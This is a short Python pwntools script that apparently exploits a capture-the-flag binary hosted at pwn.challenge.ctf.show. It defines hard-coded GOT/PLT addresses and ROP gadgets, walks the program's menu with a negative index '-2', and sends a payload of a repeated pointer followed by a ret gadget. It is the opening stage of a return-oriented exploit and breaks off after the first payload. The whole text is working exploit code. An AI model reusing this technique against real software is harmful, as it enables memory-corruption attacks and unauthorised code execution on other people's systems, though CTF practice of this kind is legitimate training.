from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
#io = process("./pwn")
io = remote('pwn.challenge.ctf.show',28201)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
message_pattern = 0x6061C0
puts_plt = 0x400BD0
puts_got = 0x606020
readn = 0x400F1E  
pop_rdi = 0x4044d3
pop_rsi_r15 = 0x4044d1
ret = 0x40150c   
io.recvuntil("option:\n")
io.sendline("1")
io.sendline("No")
io.sendline("yes")
io.sendline('-2')
payload = p64(message_pattern)*37 + p64(ret)
io.sendline(payload)
